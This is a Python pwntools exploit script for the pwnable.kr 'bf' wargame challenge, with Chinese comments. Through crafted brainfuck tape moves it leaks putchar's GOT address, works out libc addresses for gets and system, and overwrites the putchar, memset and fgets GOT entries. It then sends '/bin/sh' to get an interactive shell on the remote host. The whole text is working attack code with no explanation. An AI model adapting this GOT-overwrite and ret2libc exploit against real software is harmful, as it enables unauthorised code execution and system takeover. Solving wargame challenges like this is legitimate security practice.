#coding:utf-8
from pwn import *

context(os='linux',arch='i386',log_level='debug')

debug=0

if debug:
  p=process('./bf')
  e=ELF('/lib/ld-linux.so.2')
else:
  p=remote('pwnable.kr',9001)
  e=ELF('./bf_libc.so')

def Left(n):
  return '<'*n

def read():
  return '.>.>.>.><<<<'

def write():
  return ',>,>,>,><<<<'

#直接从IDA中得到地址
tape=0x0804A0A0
main=0x08048671

#GOT 直接从IDA中得到地址
me_got=0x0804A02C
fg_got=0x0804A010
pu_got=0x0804A030

#LIB
ge_libc=e.symbols['gets']
sy_libc=e.symbols['system']
pu_libc=e.symbols['putchar']

#执行一次putcahr()，使got表填装真实地址
payload='.'
#输出putchar()地址
payload+=Left(tape-pu_got)+read()
#覆盖putchar地址为main
payload+=write()
#覆盖memset为gets
payload+=Left(pu_got-me_got)+write()
#覆盖fgets为system
payload+=Left(me_got-fg_got)+write()
#执行main
payload+='.'

p.recvuntil("[ ]\n")
p.sendline(payload)
p.recv(1)

pu_adr=u32(p.recv(4))

ge_adr=pu_adr-pu_libc+ge_libc
sy_adr=pu_adr-pu_libc+sy_libc

log.success("putchar->"+hex(pu_adr)+'\ngetchar->'+hex(ge_adr)+'\nsystem->'+hex(sy_adr))

p.send(p32(main))
p.send(p32(ge_adr))
p.send(p32(sy_adr))

p.sendline("/bin/sh")
p.interactive()
